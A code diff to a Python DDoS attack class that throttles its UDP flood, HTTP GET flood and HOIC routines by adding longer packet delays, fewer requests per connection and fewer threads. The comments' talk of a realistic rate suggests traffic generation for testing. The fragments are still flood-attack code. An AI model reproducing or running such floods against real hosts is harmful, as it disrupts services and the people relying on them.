@@ -76,8 +76,8 @@ class DDoSAttack:
                 sock.close()
             except Exception:
                 pass
-            # Minimal delay for high rate
-            time.sleep(random.uniform(0.0001, 0.001))
+            # THROTTLED: Delay between UDP packets (0.3-0.5 sec for realistic rate)
+            time.sleep(random.uniform(0.3, 0.5))
 
     # ──────────────────────────────────────────────────────
     # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
@@ -101,8 +101,8 @@ class DDoSAttack:
                 attack_port = random.choice(http_ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # VARIATION: Variable requests per connection (20-200 for high volume but realistic)
-                for _ in range(random.randint(20, 200)):
+                # THROTTLED: Reduce requests per connection from 20-200 to 1-5
+                for _ in range(random.randint(1, 5)):
                     if not self.running or time.time() >= end_time:
                         break
 
@@ -195,11 +195,11 @@ class DDoSAttack:
             except Exception:
                 pass
 
-    def run_attack(self, num_threads=10):
+    def run_attack(self, num_threads=1):
         """Run DDoS attack with multiple threads."""
         print(f"[DDoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
         print(f"[DDoS] Techniques: LOIC-HTTP + LOIC-UDP + HOIC")
-        print(f"[DDoS] Using {num_threads} threads")
+        print(f"[DDoS] Using {num_threads} threads (throttled from 10 to reduce flow rate)")
 
         techniques = [
             self.udp_flood,
